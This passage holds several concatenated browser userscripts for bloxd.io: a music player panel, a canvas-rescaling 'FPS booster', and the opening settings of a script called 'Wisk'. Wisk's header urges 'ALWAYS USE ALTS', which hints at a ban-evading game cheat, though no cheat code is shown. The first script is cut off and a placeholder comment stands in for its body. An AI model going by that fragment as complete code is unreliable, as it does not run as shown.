    const bgObserver = new MutationObserver(applyCustomBackground);
    bgObserver.observe(document.body, { childList: true, subtree: true });
    applyCustomBackground();

    // === REST OF THE SCRIPT ===
    // ... [all other code remains unchanged] ...
})();

// ==UserScript==
// @name         Wisk Music Player (Compact)
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  Compact music player for bloxd.io with liquid glass GUI
// @author       Wisk Team
// @match        *://bloxd.io/*
// @match        https://www.bloxd.io/*
// @match        https://staging.bloxd.io/
// @grant        none
// @icon         https://i.imgur.com/gaj92pC.png?1
// ==/UserScript==

(function() {
    'use strict';
    
    // Create music player
    const wiskMusic = new Audio("https://file.garden/aKP04nPJ-0H0X3HE/Ella%20Mai%20-%20Trip%20(1).mp3");
    wiskMusic.volume = 0.4;
    wiskMusic.loop = true;

    // Create compact liquid glass UI
    const audioPanel = document.createElement('div');
    audioPanel.id = 'wisk-music-panel';
    audioPanel.innerHTML = `
        <div id="wisk-music-header">
            <div id="wisk-music-title">🎵 Wisk Player</div>
            <button id="wisk-music-minimize">−</button>
        </div>
        <div id="wisk-music-content">
            <div id="wisk-track-info">
                <div id="wisk-track-name">Ella Mai - Trip</div>
                <div id="wisk-track-status">Ready</div>
            </div>
            <div id="wisk-music-controls">
                <button id="wisk-play-button" class="wisk-btn" title="Play/Pause">
                    <span id="wisk-play-icon">▶️</span>
                </button>
                <div id="wisk-volume-container">
                    <input type="range" id="wisk-volume-slider" min="0" max="100" value="40" title="Volume">
                    <span id="wisk-volume-display">40%</span>
                </div>
            </div>
        </div>
    `;
    
    // Add compact liquid glass styles
    const wiskStyles = document.createElement('style');
    wiskStyles.textContent = `
        #wisk-music-panel {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 180px;
            background: rgba(255, 255, 255, 0.08) !important;
            backdrop-filter: blur(25px) !important;
            -webkit-backdrop-filter: blur(25px) !important;
            border: 1px solid rgba(255, 255, 255, 0.15) !important;
            border-radius: 12px !important;
            box-shadow: 
                0 4px 16px rgba(0, 0, 0, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.1),
                0 0 0 1px rgba(255, 255, 255, 0.05) !important;
            z-index: 10000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            user-select: none;
            font-size: 12px;
        }
        
        #wisk-music-panel.minimized {
            height: 32px;
            width: 120px;
        }
        
        #wisk-music-panel.minimized #wisk-music-content {
            display: none;
        }
        
        #wisk-music-panel.playing {
            animation: wiskMusicGlow 3s ease-in-out infinite;
        }
        
        @keyframes wiskMusicGlow {
            0% { box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.1); }
            50% { box-shadow: 0 6px 20px rgba(139, 79, 199, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.15); }
            100% { box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.1); }
        }
        
        #wisk-music-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 10px;
            background: rgba(255, 255, 255, 0.05);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            cursor: move;
        }
        
        #wisk-music-title {
            color: rgba(255, 255, 255, 0.95);
            font-weight: 600;
            font-size: 12px;
            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
        }
        
        #wisk-music-minimize {
            background: rgba(255, 255, 255, 0.1) !important;
            border: 1px solid rgba(255, 255, 255, 0.2) !important;
            border-radius: 6px !important;
            color: rgba(255, 255, 255, 0.9) !important;
            padding: 2px 6px !important;
            font-size: 12px !important;
            line-height: 1 !important;
            cursor: pointer !important;
            transition: all 0.2s ease !important;
        }
        
        #wisk-music-minimize:hover {
            background: rgba(255, 255, 255, 0.15) !important;
            border-color: rgba(255, 255, 255, 0.3) !important;
            transform: scale(1.05);
        }
        
        #wisk-music-content {
            padding: 10px;
        }
        
        #wisk-track-info {
            text-align: center;
            margin-bottom: 10px;
        }
        
        #wisk-track-name {
            color: rgba(255, 255, 255, 0.95);
            font-size: 11px;
            font-weight: 600;
            margin-bottom: 2px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        #wisk-track-status {
            color: rgba(255, 255, 255, 0.7);
            font-size: 10px;
            font-style: italic;
        }
        
        #wisk-music-controls {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .wisk-btn {
            background: rgba(139, 79, 199, 0.2) !important;
            backdrop-filter: blur(15px) !important;
            -webkit-backdrop-filter: blur(15px) !important;
            border: 1px solid rgba(139, 79, 199, 0.4) !important;
            border-radius: 8px !important;
            color: rgba(255, 255, 255, 0.95) !important;
            padding: 6px 10px !important;
            font-size: 12px !important;
            cursor: pointer !important;
            transition: all 0.2s ease !important;
            min-width: 32px;
            display: flex;
            justify-content: center;
        }
        
        .wisk-btn:hover {
            background: rgba(139, 79, 199, 0.3) !important;
            border-color: rgba(139, 79, 199, 0.6) !important;
            transform: translateY(-1px) scale(1.02) !important;
            box-shadow: 
                0 4px 12px rgba(139, 79, 199, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.2) !important;
        }
        
        .wisk-btn:active {
            transform: translateY(0px) scale(0.98) !important;
        }
        
        #wisk-play-icon {
            font-size: 12px;
            transition: all 0.2s ease;
        }
        
        .wisk-btn.playing #wisk-play-icon {
            animation: wiskPulse 2s ease-in-out infinite;
        }
        
        @keyframes wiskPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }
        
        #wisk-volume-container {
            display: flex;
            align-items: center;
            gap: 6px;
            flex: 1;
        }
        
        #wisk-volume-slider {
            flex: 1;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            outline: none;
            -webkit-appearance: none;
            cursor: pointer;
            min-width: 60px;
        }
        
        #wisk-volume-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 12px;
            height: 12px;
            background: rgba(139, 79, 199, 0.8);
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 1px 4px rgba(139, 79, 199, 0.4);
            transition: all 0.2s ease;
        }
        
        #wisk-volume-slider::-webkit-slider-thumb:hover {
            background: rgba(139, 79, 199, 1);
            transform: scale(1.1);
            box-shadow: 0 2px 6px rgba(139, 79, 199, 0.6);
        }
        
        #wisk-volume-display {
            color: rgba(255, 255, 255, 0.8);
            font-size: 10px;
            font-weight: 600;
            min-width: 26px;
            text-align: center;
        }
    `;
    
    document.head.appendChild(wiskStyles);
    document.body.appendChild(audioPanel);
    
    // Get control elements
    const volumeControl = document.getElementById('wisk-volume-slider');
    const volumeDisplay = document.getElementById('wisk-volume-display');
    const playButton = document.getElementById('wisk-play-button');
    const playIcon = document.getElementById('wisk-play-icon');
    const trackStatus = document.getElementById('wisk-track-status');
    const minimizeBtn = document.getElementById('wisk-music-minimize');
    const musicPanel = document.getElementById('wisk-music-panel');
    
    // Load saved settings
    const savedVolume = localStorage.getItem('wisk-music-volume');
    if (savedVolume !== null) {
        volumeControl.value = savedVolume;
        wiskMusic.volume = savedVolume / 100;
        volumeDisplay.textContent = savedVolume + '%';
    }
    
    const savedMinimized = localStorage.getItem('wisk-music-minimized');
    if (savedMinimized === 'true') {
        musicPanel.classList.add('minimized');
        minimizeBtn.textContent = '+';
    }
    
    // Auto-start music
    setTimeout(() => {
        wiskMusic.play().catch(e => {
            console.log("🎵 Playback requires user interaction");
            trackStatus.textContent = "Click to play";
        });
    }, 1000);
    
    // Update UI based on playing state
    function updatePlayButton(isPlaying) {
        if (isPlaying) {
            playIcon.textContent = '⏸️';
            trackStatus.textContent = 'Playing...';
            playButton.classList.add('playing');
            musicPanel.classList.add('playing');
        } else {
            playIcon.textContent = '▶️';
            trackStatus.textContent = 'Paused';
            playButton.classList.remove('playing');
            musicPanel.classList.remove('playing');
        }
    }
    
    // Play/Pause button event
    playButton.addEventListener('click', () => {
        if (wiskMusic.paused) {
            wiskMusic.play().then(() => {
                updatePlayButton(true);
            }).catch(e => {
                console.error("🎵 Audio play failed:", e);
                trackStatus.textContent = "Click to play";
            });
        } else {
            wiskMusic.pause();
            updatePlayButton(false);
        }
    });
    
    // Volume control event
    volumeControl.addEventListener('input', () => {
        const volume = volumeControl.value;
        wiskMusic.volume = volume / 100;
        volumeDisplay.textContent = volume + '%';
        localStorage.setItem('wisk-music-volume', volume);
    });
    
    // Minimize/maximize functionality
    minimizeBtn.addEventListener('click', () => {
        if (musicPanel.classList.contains('minimized')) {
            musicPanel.classList.remove('minimized');
            minimizeBtn.textContent = '−';
            localStorage.setItem('wisk-music-minimized', 'false');
        } else {
            musicPanel.classList.add('minimized');
            minimizeBtn.textContent = '+';
            localStorage.setItem('wisk-music-minimized', 'true');
        }
    });
    
    // Enhanced drag functionality
    const musicHeader = document.getElementById('wisk-music-header');
    let isDragging = false;
    let offsetX, offsetY;
    let startX, startY;
    
    // Load saved position
    const savedPos = localStorage.getItem('wisk-music-position');
    if (savedPos) {
        const pos = JSON.parse(savedPos);
        musicPanel.style.left = pos.x + 'px';
        musicPanel.style.top = pos.y + 'px';
        musicPanel.style.right = 'auto';
        musicPanel.style.bottom = 'auto';
    }
    
    musicHeader.addEventListener('mousedown', (e) => {
        if (e.target === musicHeader || e.target.id === 'wisk-music-title') {
            isDragging = true;
            
            // Get current position
            const rect = musicPanel.getBoundingClientRect();
            
            // Calculate offset between mouse and panel position
            offsetX = e.clientX - rect.left;
            offsetY = e.clientY - rect.top;
            
            // Store starting position for click detection
            startX = e.clientX;
            startY = e.clientY;
            
            // Change cursor style
            musicPanel.style.cursor = 'grabbing';
            musicHeader.style.cursor = 'grabbing';
            
            // Prevent text selection during drag
            e.preventDefault();
        }
    });
    
    document.addEventListener('mousemove', (e) => {
        if (!isDragging) return;
        
        // Calculate new position
        let newX = e.clientX - offsetX;
        let newY = e.clientY - offsetY;
        
        // Constrain to window boundaries
        const panelWidth = musicPanel.offsetWidth;
        const panelHeight = musicPanel.offsetHeight;
        
        newX = Math.max(0, Math.min(window.innerWidth - panelWidth, newX));
        newY = Math.max(0, Math.min(window.innerHeight - panelHeight, newY));
        
        // Apply new position
        musicPanel.style.left = newX + 'px';
        musicPanel.style.top = newY + 'px';
        musicPanel.style.right = 'auto';
        musicPanel.style.bottom = 'auto';
    });
    
    document.addEventListener('mouseup', (e) => {
        if (!isDragging) return;
        
        isDragging = false;
        musicPanel.style.cursor = '';
        musicHeader.style.cursor = '';
        
        // Save position if it's not a click (mouse moved more than 5px)
        if (Math.abs(e.clientX - startX) > 5 || Math.abs(e.clientY - startY) > 5) {
            const rect = musicPanel.getBoundingClientRect();
            localStorage.setItem('wisk-music-position', JSON.stringify({
                x: rect.left,
                y: rect.top
            }));
        }
    });
    
    // Audio events
    wiskMusic.addEventListener('play', () => updatePlayButton(true));
    wiskMusic.addEventListener('pause', () => updatePlayButton(false));
    wiskMusic.addEventListener('ended', () => updatePlayButton(false));
    
    console.log('🎵 Compact Wisk Music Player loaded successfully!');
})();

// ==UserScript==
// @name         White FPS Booster with Ultra HD Options
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  White-themed FPS booster with 4K+ resolution options, draggable UI, and open/close functionality
// @author       You
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        unsafeWindow
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    // Fallback storage for when GM functions aren't available
    const storage = {
        setValue: function(key, value) {
            try {
                if (typeof GM_setValue !== 'undefined') {
                    GM_setValue(key, value);
                } else {
                    localStorage.setItem('fps_booster_' + key, JSON.stringify(value));
                }
            } catch (e) {
                console.warn('[FPS Booster] Storage not available:', e);
            }
        },
        getValue: function(key, defaultValue) {
            try {
                if (typeof GM_getValue !== 'undefined') {
                    return GM_getValue(key, defaultValue);
                } else {
                    const stored = localStorage.getItem('fps_booster_' + key);
                    return stored ? JSON.parse(stored) : defaultValue;
                }
            } catch (e) {
                console.warn('[FPS Booster] Storage not available:', e);
                return defaultValue;
            }
        }
    };

    class WhiteFPSBooster {
        constructor() {
            this.enabled = false;
            this.canvas = null;
            this.ui = null;
            this.fpsCounter = 0;
            this.cpsCounter = 0;
            this.lastTime = performance.now();
            this.frameCount = 0;
            this.clickCount = 0;
            this.lastSecond = Math.floor(Date.now() / 1000);
            this.isDragging = false;
            this.dragOffset = { x: 0, y: 0 };
            this.animationId = null;
            this.intervalId = null;
            this.isOpen = storage.getValue('panelOpen', true);
            
            this.settings = {
                resolutionScale: storage.getValue('resolutionScale', 1.0),
                position: storage.getValue('position', { x: 20, y: 20 })
            };

            this.init();
        }

        init() {
            try {
                this.injectStyles();
                this.createUI();
                this.setupEventListeners();
                this.startCounters();
                console.log('[FPS Booster] Successfully initialized');
            } catch (error) {
                console.error('[FPS Booster] Initialization error:', error);
            }
        }

        injectStyles() {
            const style = document.createElement('style');
            style.id = 'fps-booster-styles';
            style.textContent = `
                .fps-booster-container {
                    position: fixed;
                    z-index: 999999;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    user-select: none;
                    pointer-events: auto;
                    font-size: 14px;
                }

                .fps-booster-panel {
                    background: rgba(255, 255, 255, 0.95);
                    backdrop-filter: blur(20px);
                    -webkit-backdrop-filter: blur(20px);
                    border: 1px solid rgba(0, 0, 0, 0.1);
                    border-radius: 12px;
                    padding: 16px;
                    box-shadow: 
                        0 8px 32px rgba(0, 0, 0, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.9);
                    min-width: 260px;
                    transition: all 0.3s ease;
                    cursor: move;
                    color: #333;
                }

                .fps-booster-panel:hover {
                    background: rgba(255, 255, 255, 0.98);
                    border-color: rgba(0, 0, 0, 0.15);
                    transform: translateY(-1px);
                }

                .fps-booster-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 12px;
                    padding-bottom: 8px;
                    border-bottom: 1px solid rgba(0, 0, 0, 0.05);
                }

                .fps-booster-title {
                    color: #222;
                    font-size: 14px;
                    font-weight: 600;
                    margin: 0;
                }

                .fps-booster-close {
                    background: rgba(0, 0, 0, 0.05);
                    border: 1px solid rgba(0, 0, 0, 0.1);
                    border-radius: 6px;
                    color: rgba(0, 0, 0, 0.6);
                    cursor: pointer;
                    font-size: 12px;
                    padding: 4px 8px;
                    transition: all 0.2s ease;
                    outline: none;
                }

                .fps-booster-close:hover {
                    background: rgba(0, 0, 0, 0.1);
                    color: #000;
                }

                .fps-booster-stats {
                    display: flex;
                    gap: 8px;
                    margin-bottom: 12px;
                }

                .fps-booster-stat {
                    flex: 1;
                    background: rgba(0, 0, 0, 0.03);
                    border: 1px solid rgba(0, 0, 0, 0.05);
                    border-radius: 8px;
                    padding: 8px;
                    text-align: center;
                }

                .fps-booster-stat-label {
                    color: rgba(0, 0, 0, 0.5);
                    font-size: 11px;
                    margin-bottom: 2px;
                    text-transform: uppercase;
                    letter-spacing: 0.5px;
                }

                .fps-booster-stat-value {
                    color: #0066ff;
                    font-size: 18px;
                    font-weight: 700;
                    text-shadow: 0 0 8px rgba(0, 102, 255, 0.1);
                }

                .fps-booster-controls {
                    margin-top: 12px;
                }

                .fps-booster-toggle {
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    margin-bottom: 12px;
                }

                .fps-booster-toggle-label {
                    color: rgba(0, 0, 0, 0.8);
                    font-size: 13px;
                    font-weight: 500;
                }

                .fps-booster-switch {
                    position: relative;
                    width: 44px;
                    height: 24px;
                    background: rgba(0, 0, 0, 0.05);
                    border: 1px solid rgba(0, 0, 0, 0.1);
                    border-radius: 12px;
                    cursor: pointer;
                    transition: all 0.3s ease;
                }

                .fps-booster-switch.active {
                    background: rgba(0, 102, 255, 0.2);
                    border-color: rgba(0, 102, 255, 0.4);
                }

                .fps-booster-switch-handle {
                    position: absolute;
                    top: 1px;
                    left: 1px;
                    width: 20px;
                    height: 20px;
                    background: rgba(255, 255, 255, 0.9);
                    border-radius: 50%;
                    transition: transform 0.3s ease;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                }

                .fps-booster-switch.active .fps-booster-switch-handle {
                    transform: translateX(20px);
                    background: #0066ff;
                }

                .fps-booster-slider-group {
                    margin-bottom: 8px;
                }

                .fps-booster-slider-label {
                    color: rgba(0, 0, 0, 0.8);
                    font-size: 12px;
                    margin-bottom: 6px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }

                .fps-booster-slider-value {
                    color: #0066ff;
                    font-weight: 600;
                }

                .fps-booster-slider {
                    width: 100%;
                    height: 4px;
                    background: rgba(0, 0, 0, 0.05);
                    border-radius: 2px;
                    outline: none;
                    cursor: pointer;
                    -webkit-appearance: none;
                    appearance: none;
                }

                .fps-booster-slider::-webkit-slider-thumb {
                    -webkit-appearance: none;
                    appearance: none;
                    width: 16px;
                    height: 16px;
                    background: #0066ff;
                    border-radius: 50%;
                    cursor: pointer;
                    box-shadow: 0 2px 6px rgba(0, 102, 255, 0.2);
                    transition: all 0.2s ease;
                }

                .fps-booster-slider::-webkit-slider-thumb:hover {
                    transform: scale(1.1);
                }

                .fps-booster-slider::-moz-range-thumb {
                    width: 16px;
                    height: 16px;
                    background: #0066ff;
                    border-radius: 50%;
                    cursor: pointer;
                    border: none;
                    box-shadow: 0 2px 6px rgba(0, 102, 255, 0.2);
                }

                .fps-booster-dragging {
                    transition: none !important;
                }

                .fps-booster-hidden {
                    display: none !important;
                }

                .fps-booster-stat-value.high {
                    animation: pulse 2s infinite;
                }

                .fps-booster-toggle-button {
                    position: fixed;
                    z-index: 999998;
                    width: 40px;
                    height: 40px;
                    background: rgba(255, 255, 255, 0.9);
                    border: 1px solid rgba(0, 0, 0, 0.1);
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    cursor: pointer;
                    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
                    transition: all 0.2s ease;
                }

                .fps-booster-toggle-button:hover {
                    background: white;
                    transform: scale(1.1);
                }

                @keyframes pulse {
                    0%, 100% { 
                        text-shadow: 0 0 8px rgba(0, 102, 255, 0.1);
                    }
                    50% { 
                        text-shadow: 0 0 16px rgba(0, 102, 255, 0.3);
                    }
                }
            `;
            
            // Remove existing styles if any
            const existing = document.getElementById('fps-booster-styles');
            if (existing) {
                existing.remove();
            }
            
            document.head.appendChild(style);
        }

        createUI() {
            // Main container
            this.ui = document.createElement('div');
            this.ui.className = 'fps-booster-container';
            this.ui.id = 'fps-booster-ui';
            this.ui.style.left = this.settings.position.x + 'px';
            this.ui.style.top = this.settings.position.y + 'px';
            if (!this.isOpen) this.ui.classList.add('fps-booster-hidden');

            this.ui.innerHTML = `
                <div class="fps-booster-panel">
                    <div class="fps-booster-header">
                        <h3 class="fps-booster-title">🚀 FPS Booster</h3>
                        <button class="fps-booster-close" type="button">✕</button>
                    </div>
                    
                    <div class="fps-booster-stats">
                        <div class="fps-booster-stat">
                            <div class="fps-booster-stat-label">FPS</div>
                            <div class="fps-booster-stat-value" id="fps-display">0</div>
                        </div>
                        <div class="fps-booster-stat">
                            <div class="fps-booster-stat-label">CPS</div>
                            <div class="fps-booster-stat-value" id="cps-display">0</div>
                        </div>
                    </div>

                    <div class="fps-booster-controls">
                        <div class="fps-booster-toggle">
                            <span class="fps-booster-toggle-label">FPS Boost</span>
                            <div class="fps-booster-switch" id="fps-toggle">
                                <div class="fps-booster-switch-handle"></div>
                            </div>
                        </div>

                        <div class="fps-booster-slider-group">
                            <div class="fps-booster-slider-label">
                                <span>Resolution Scale</span>
                                <span class="fps-booster-slider-value" id="resolution-value">${Math.round(this.settings.resolutionScale * 100)}%</span>
                            </div>
                            <input type="range" class="fps-booster-slider" id="resolution-slider" 
                                   min="0.1" max="4.0" step="0.05" value="${this.settings.resolutionScale}">
                        </div>
                    </div>
                </div>
            `;

            // Toggle button (for opening when closed)
            this.toggleButton = document.createElement('div');
            this.toggleButton.className = 'fps-booster-toggle-button';
            this.toggleButton.innerHTML = '⚡';
            this.toggleButton.style.left = (this.settings.position.x + 10) + 'px';
            this.toggleButton.style.top = (this.settings.position.y + 10) + 'px';
            this.toggleButton.addEventListener('click', () => this.togglePanel());

            // Remove existing UI if any
            const existing = document.getElementById('fps-booster-ui');
            if (existing) {
                existing.remove();
            }
            const existingToggle = document.querySelector('.fps-booster-toggle-button');
            if (existingToggle) {
                existingToggle.remove();
            }

            document.body.appendChild(this.ui);
            document.body.appendChild(this.toggleButton);
            this.updateToggleButtonVisibility();
        }

        setupEventListeners() {
            try {
                const panel = this.ui.querySelector('.fps-booster-panel');
                const closeBtn = this.ui.querySelector('.fps-booster-close');
                const toggle = this.ui.querySelector('#fps-toggle');
                const slider = this.ui.querySelector('#resolution-slider');

                if (!panel || !closeBtn || !toggle || !slider) {
                    throw new Error('UI elements not found');
                }

                // Close button
                closeBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    e.preventDefault();
                    this.closePanel();
                }, false);

                // Toggle switch
                toggle.addEventListener('click', (e) => {
                    e.stopPropagation();
                    e.preventDefault();
                    this.toggleBooster();
                }, false);

                // Resolution slider
                slider.addEventListener('input', (e) => {
                    this.updateResolution(parseFloat(e.target.value));
                }, false);

                // Dragging functionality
                this.setupDragging(panel, closeBtn, toggle, slider);

                // Click counter
                document.addEventListener('click', () => {
                    this.clickCount++;
                }, true);

                // Keyboard shortcut
                document.addEventListener('keydown', (e) => {
                    if (e.ctrlKey && e.shiftKey && e.code === 'KeyF') {
                        e.preventDefault();
                        this.togglePanel();
                    }
                }, false);

            } catch (error) {
                console.error('[FPS Booster] Event listener setup error:', error);
            }
        }

        setupDragging(panel, closeBtn, toggle, slider) {
            let startX, startY, startLeft, startTop;

            panel.addEventListener('mousedown', (e) => {
                // Don't drag if clicking on interactive elements
                if (e.target === closeBtn || 
                    e.target.closest('.fps-booster-switch') || 
                    e.target.type === 'range' ||
                    e.target.closest('.fps-booster-close')) {
                    return;
                }
                
                this.isDragging = true;
                panel.classList.add('fps-booster-dragging');
                
                const rect = this.ui.getBoundingClientRect();
                startX = e.clientX;
                startY = e.clientY;
                startLeft = rect.left;
                startTop = rect.top;
                
                e.preventDefault();
            }, false);

            document.addEventListener('mousemove', (e) => {
                if (!this.isDragging) return;
                
                const deltaX = e.clientX - startX;
                const deltaY = e.clientY - startY;
                
                const newX = Math.max(0, Math.min(window.innerWidth - this.ui.offsetWidth, startLeft + deltaX));
                const newY = Math.max(0, Math.min(window.innerHeight - this.ui.offsetHeight, startTop + deltaY));
                
                this.ui.style.left = newX + 'px';
                this.ui.style.top = newY + 'px';
                this.toggleButton.style.left = (newX + 10) + 'px';
                this.toggleButton.style.top = (newY + 10) + 'px';
            }, false);

            document.addEventListener('mouseup', () => {
                if (this.isDragging) {
                    this.isDragging = false;
                    panel.classList.remove('fps-booster-dragging');
                    
                    // Save position
                    this.settings.position = {
                        x: parseInt(this.ui.style.left) || 0,
                        y: parseInt(this.ui.style.top) || 0
                    };
                    storage.setValue('position', this.settings.position);
                }
            }, false);
        }

        togglePanel() {
            this.isOpen = !this.isOpen;
            storage.setValue('panelOpen', this.isOpen);
            
            if (this.isOpen) {
                this.ui.classList.remove('fps-booster-hidden');
                this.toggleButton.style.display = 'none';
            } else {
                this.ui.classList.add('fps-booster-hidden');
                this.toggleButton.style.display = 'flex';
            }
        }

        closePanel() {
            this.isOpen = false;
            storage.setValue('panelOpen', false);
            this.ui.classList.add('fps-booster-hidden');
            this.toggleButton.style.display = 'flex';
        }

        updateToggleButtonVisibility() {
            if (this.isOpen) {
                this.toggleButton.style.display = 'none';
            } else {
                this.toggleButton.style.display = 'flex';
            }
        }

        toggleBooster() {
            this.enabled = !this.enabled;
            this.updateToggleState();
            if (this.enabled) {
                this.enable();
            } else {
                this.disable();
            }
        }

        updateResolution(value) {
            this.settings.resolutionScale = value;
            const valueElement = document.getElementById('resolution-value');
            if (valueElement) {
                valueElement.textContent = Math.round(value * 100) + '%';
                if (value > 1.0) {
                    valueElement.style.color = '#ff3300';
                } else {
                    valueElement.style.color = '#0066ff';
                }
            }
            storage.setValue('resolutionScale', this.settings.resolutionScale);
            this.applySettings();
        }

        updateToggleState() {
            const toggle = this.ui.querySelector('#fps-toggle');
            if (toggle) {
                if (this.enabled) {
                    toggle.classList.add('active');
                } else {
                    toggle.classList.remove('active');
                }
            }
        }

        startCounters() {
            // FPS Counter
            const updateFPS = () => {
                this.frameCount++;
                const now = performance.now();
                
                if (now >= this.lastTime + 1000) {
                    this.fpsCounter = Math.round((this.frameCount * 1000) / (now - this.lastTime));
                    this.frameCount = 0;
                    this.lastTime = now;
                    
                    const fpsDisplay = document.getElementById('fps-display');
                    if (fpsDisplay) {
                        fpsDisplay.textContent = this.fpsCounter;
                        if (this.fpsCounter >= 60) {
                            fpsDisplay.classList.add('high');
                        } else {
                            fpsDisplay.classList.remove('high');
                        }
                    }
                }
                
                this.animationId = requestAnimationFrame(updateFPS);
            };
            this.animationId = requestAnimationFrame(updateFPS);

            // CPS Counter
            this.intervalId = setInterval(() => {
                const currentSecond = Math.floor(Date.now() / 1000);
                if (currentSecond > this.lastSecond) {
                    this.cpsCounter = this.clickCount;
                    this.clickCount = 0;
                    this.lastSecond = currentSecond;
                    
                    const cpsDisplay = document.getElementById('cps-display');
                    if (cpsDisplay) {
                        cpsDisplay.textContent = this.cpsCounter;
                        if (this.cpsCounter >= 10) {
                            cpsDisplay.classList.add('high');
                        } else {
                            cpsDisplay.classList.remove('high');
                        }
                    }
                }
            }, 100);
        }

        findCanvas() {
            // Try multiple selectors for different games/sites
            const selectors = [
                '#noa-canvas',
                'canvas[id*="game"]',
                'canvas[class*="game"]',
                'canvas[id*="unity"]',
                'canvas[class*="unity"]',
                '#unity-canvas',
                '#gameCanvas',
                '.game-canvas',
                'canvas:not([style*="display: none"])'
            ];

            for (const selector of selectors) {
                const canvas = document.querySelector(selector);
                if (canvas && canvas.offsetWidth > 0 && canvas.offsetHeight > 0) {
                    return canvas;
                }
            }

            // Fallback: find the largest visible canvas
            const canvases = Array.from(document.querySelectorAll('canvas'));
            return canvases
                .filter(c => c.offsetWidth > 0 && c.offsetHeight > 0)
                .sort((a, b) => (b.offsetWidth * b.offsetHeight) - (a.offsetWidth * a.offsetHeight))[0] || null;
        }

        enable() {
            try {
                this.canvas = this.findCanvas();
                
                if (!this.canvas) {
                    console.warn('[FPS Booster] No suitable canvas found');
                    return;
                }

                if (!this.canvas.dataset.originalWidth) {
                    this.canvas.dataset.originalWidth = this.canvas.width || this.canvas.clientWidth || 800;
                    this.canvas.dataset.originalHeight = this.canvas.height || this.canvas.clientHeight || 600;
                }

                this.applySettings();
                console.log('[FPS Booster] Enabled on canvas:', this.canvas);
            } catch (error) {
                console.error('[FPS Booster] Enable error:', error);
            }
        }

        disable() {
            try {
                if (this.canvas && this.canvas.dataset.originalWidth) {
                    this.canvas.width = parseInt(this.canvas.dataset.originalWidth, 10);
                    this.canvas.height = parseInt(this.canvas.dataset.originalHeight, 10);
                    this.canvas.style.width = '';
                    this.canvas.style.height = '';
                    delete this.canvas.dataset.originalWidth;
                    delete this.canvas.dataset.originalHeight;
                }
                console.log('[FPS Booster] Disabled');
            } catch (error) {
                console.error('[FPS Booster] Disable error:', error);
            }
        }

        applySettings() {
            if (!this.canvas || !this.enabled) return;
            
            try {
                const originalWidth = parseInt(this.canvas.dataset.originalWidth, 10);
                const originalHeight = parseInt(this.canvas.dataset.originalHeight, 10);
                
                if (!originalWidth || !originalHeight) return;
                
                const newWidth = Math.round(originalWidth * this.settings.resolutionScale);
                const newHeight = Math.round(originalHeight * this.settings.resolutionScale);
                
                this.canvas.width = newWidth;
                this.canvas.height = newHeight;
                this.canvas.style.width = '100%';
                this.canvas.style.height = '100%';
            } catch (error) {
                console.error('[FPS Booster] Apply settings error:', error);
            }
        }

        destroy() {
            try {
                if (this.animationId) {
                    cancelAnimationFrame(this.animationId);
                }
                if (this.intervalId) {
                    clearInterval(this.intervalId);
                }
                if (this.ui && this.ui.parentNode) {
                    this.ui.parentNode.removeChild(this.ui);
                }
                if (this.toggleButton && this.toggleButton.parentNode) {
                    this.toggleButton.parentNode.removeChild(this.toggleButton);
                }
                this.disable();
            } catch (error) {
                console.error('[FPS Booster] Destroy error:', error);
            }
        }
    }

    // Initialize with proper error handling
    function initializeBooster() {
        try {
            // Wait for DOM to be fully loaded
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', () => {
                    setTimeout(() => new WhiteFPSBooster(), 500);
                });
            } else {
                setTimeout(() => new WhiteFPSBooster(), 500);
            }
        } catch (error) {
            console.error('[FPS Booster] Initialization failed:', error);
        }
    }

    // Start the script
    initializeBooster();

})();

// ==UserScript==
// @name        Wisk
// @namespace   wisk
// @match       https://*.bloxd.io/*
// @version     0.3.8
// @author      Developed by natha
// @description 🟢https://discord.gg/TQPqe9r2
// ==/UserScript==
//
// ⚠️⚠️ALWAYS USE ALTS⚠️⚠️
//
// 🟢https://discord.gg/G6ksFfQdaW join this for updates please.🟢
//(() => {

//__START__SETTINGS______________________________________________

const defaultColor = "#D3D3D3" //-------------------ACCENT COLOR

const defaultBackGroundColor = "#D3D3D3" //---------Bacground color

